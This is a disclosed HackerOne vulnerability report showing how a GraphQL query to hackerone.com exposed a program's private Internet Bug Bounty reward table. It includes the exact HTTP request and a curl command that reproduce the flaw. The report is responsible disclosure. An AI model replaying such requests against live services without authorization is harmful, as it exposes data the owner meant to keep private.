# Being able to disclose IBB bounty table of any public program

## Report Details
- **Report ID**: 2322082
- **URL**: https://hackerone.com/reports/2322082
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-01-16T13:34:59.541Z
- **Disclosed**: 2024-03-17T10:33:32.545Z

## Reporter
- **Username**: akashhamal0x01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Hi there, I hope you are doing well :)

According to  https://docs.hackerone.com/en/articles/8496298-internet-bug-bounty 

██████

It says "You can opt-in by setting up your bounty table on your main program’s rewards settings page (instructions below). This bounty table is private and indicates how much you will award for vulnerabilities discovered in open-source projects"

Which means the IBB bounty table is private but i was able to disclose IBB bounty table


### Steps To Reproduce

1.  Send this HTTP request:

```HTTP


POST /graphql HTTP/2
Host: hackerone.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json
Content-Type: application/json
Content-Length: 157
Te: trailers

{"query":"{\r\n  team(handle: \"security\") {\r\n\r\nibb_bounty_table {\r\n      critical\r\n      high\r\n      medium\r\n      low\r\n    }\r\n}\r\n}\r\n"}

```

OR 

run this curl command :


```

curl -i -s -k -X $'POST' \
    -H $'Host: hackerone.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'Content-Length: 157' -H $'Te: trailers' \
    --data-binary $'{\"query\":\"{\\r\\n  team(handle: \\\"security\\\") {\\r\\n\\r\\nibb_bounty_table {\\r\\n      critical\\r\\n      high\\r\\n      medium\\r\\n      low\\r\\n    }\\r\\n}\\r\\n}\\r\\n\"}' \
    $'https://hackerone.com/graphql'

```
it will disclose IBB bounty table of Hackerone:

█████

## Impact

Private information disclosure

## Attachments
No attachments
